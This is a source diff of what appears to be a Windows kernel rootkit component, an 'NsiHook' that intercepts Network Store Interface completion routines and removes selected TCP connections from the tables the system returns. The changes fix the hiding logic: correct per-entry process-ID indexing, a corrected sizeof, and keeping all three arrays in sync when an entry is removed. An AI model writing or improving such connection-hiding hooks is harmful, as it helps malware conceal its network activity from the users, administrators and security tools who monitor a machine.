@@ -90,8 +90,14 @@ char* GetProcessNameFromPid(HANDLE pid)
 
 static VOID PrintTCPInformation(ULONG ProcessId, ULONG localIP, USHORT localPort, ULONG foreignIP)
 {
-	ASSERT(ProcessId);
-	DbgPrint("%ld:[%s]\t", ProcessId, GetProcessNameFromPid((HANDLE)ProcessId));
+	if(ProcessId)
+	{
+		DbgPrint("%PID[%ld]:%s\t", ProcessId, GetProcessNameFromPid((HANDLE)ProcessId));
+	}
+	else
+	{
+		DbgPrint("%PID[%ld]\t", ProcessId);
+	}
 
 	union
 	{
@@ -154,19 +160,20 @@ NTSTATUS NsiHook::NetNSIProxyCompletionRoutineX86(
 #if DBG
 		/* PrintSocketAddr(pTcpEntry[i].localEntry.dwIP, pTcpEntry[i].localEntry.Port,
 			pTcpEntry[i].remoteEntry.dwIP);	*/
-		PrintTCPInformation(pNsiProcessIdInfo->dwProcessId, pTcpEntry[i].localEntry.dwIP, pTcpEntry[i].localEntry.Port,
+		PrintTCPInformation(pNsiProcessIdInfo[i].dwProcessId, pTcpEntry[i].localEntry.dwIP, pTcpEntry[i].localEntry.Port,
 			pTcpEntry[i].remoteEntry.dwIP);
 #endif
 
 		if (NetHook::NetIsHiddenIpAddress(pTcpEntry[i].localEntry.dwIP,
 			pTcpEntry[i].localEntry.Port,
 			pTcpEntry[i].remoteEntry.dwIP, 
-			pNsiProcessIdInfo->dwProcessId))
+			pNsiProcessIdInfo[i].dwProcessId))
 		{
 			// NSI will map status array entry to tcp table array entry
-			// we must modify both synchronously
+			// we must modify all synchronously
 			RtlCopyMemory(&pTcpEntry[i], &pTcpEntry[i + 1], sizeof(INTERNAL_TCP_TABLE_ENTRY) * (numOfEntries - i));
-			RtlCopyMemory(&pNsiStatusEntry[i], &pNsiStatusEntry[i + 1], sizeof(PNSI_STATUS_ENTRY) * (numOfEntries - i));
+			RtlCopyMemory(&pNsiStatusEntry[i], &pNsiStatusEntry[i + 1], sizeof(NSI_STATUS_ENTRY) * (numOfEntries - i));
+			RtlCopyMemory(&pNsiProcessIdInfo[i], &pNsiProcessIdInfo[i + 1], sizeof(NSI_PROCESSID_INFO) * (numOfEntries - i));
 			numOfEntries--;
 			NsiParam->TcpConnCount--;
 			i--;
@@ -237,21 +244,22 @@ NTSTATUS NsiHook::NetNSIProxyCompletionRoutine(
 	{
 #if DBG
 		// ASSERT(NsiBufferEntries[i].IpAddress == pTcpEntry[i].remoteEntry.dwIP);
-		PrintTCPInformation(pNsiProcessIdInfo->dwProcessId, pTcpEntry[i].localEntry.dwIP, pTcpEntry[i].localEntry.Port,
+		PrintTCPInformation(pNsiProcessIdInfo[i].dwProcessId, pTcpEntry[i].localEntry.dwIP, pTcpEntry[i].localEntry.Port,
 			pTcpEntry[i].remoteEntry.dwIP);
 #endif
 
 		if (NetHook::NetIsHiddenIpAddress(pTcpEntry[i].localEntry.dwIP,
 			pTcpEntry[i].localEntry.Port,
 			pTcpEntry[i].remoteEntry.dwIP, 
-			pNsiProcessIdInfo->dwProcessId))
+			pNsiProcessIdInfo[i].dwProcessId))
 		{
 			// RtlZeroMemory(&pTcpEntry[i], sizeof(INTERNAL_TCP_TABLE_ENTRY));
 
 			// NSI will map status array entry to tcp table array entry
-			// we must modify both synchronously
+			// we must modify all synchronously
 			RtlCopyMemory(&pTcpEntry[i], &pTcpEntry[i + 1], sizeof(INTERNAL_TCP_TABLE_ENTRY) * (numOfEntries - i));
-			RtlCopyMemory(&pNsiStatusEntry[i], &pNsiStatusEntry[i + 1], sizeof(PNSI_STATUS_ENTRY) * (numOfEntries - i));
+			RtlCopyMemory(&pNsiStatusEntry[i], &pNsiStatusEntry[i + 1], sizeof(NSI_STATUS_ENTRY) * (numOfEntries - i));
+			RtlCopyMemory(&pNsiProcessIdInfo[i], &pNsiProcessIdInfo[i + 1], sizeof(NSI_PROCESSID_INFO) * (numOfEntries - i));
 			numOfEntries--;
 			NsiParam->ConnCount--;
 			i--;
